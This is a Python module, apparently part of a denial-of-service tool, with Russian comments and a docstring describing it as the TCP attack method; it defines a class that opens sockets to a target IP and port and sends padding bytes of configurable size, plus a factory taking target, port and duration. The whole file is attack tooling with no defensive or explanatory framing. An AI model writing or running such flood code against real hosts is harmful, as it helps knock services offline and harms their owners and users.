from sender.utils.network import create_tcp_socket
from sender.methods.base_method import BaseMethod

class TCPMethod(BaseMethod):
    """Реализация TCP метода атаки"""
    
    def send_packet(self):
        sock = create_tcp_socket(self.target_ip, self.target_port, self.settings)
        if sock:
            try:
                # Отправка данных
                data = b'X' * self.settings.packet_size
                sock.send(data)
                
                if self.settings.verbose:
                    print(f"Отправлен TCP пакет на {self.target_ip}:{self.target_port}")
            except Exception as e:
                if self.settings.verbose:
                    print(f"Ошибка при отправке TCP: {e}")
            finally:
                sock.close()

def tcp(target_ip, target_port, duration, settings):
    """Фабрика для создания TCP метода"""
    return TCPMethod(target_ip, target_port, duration, settings)
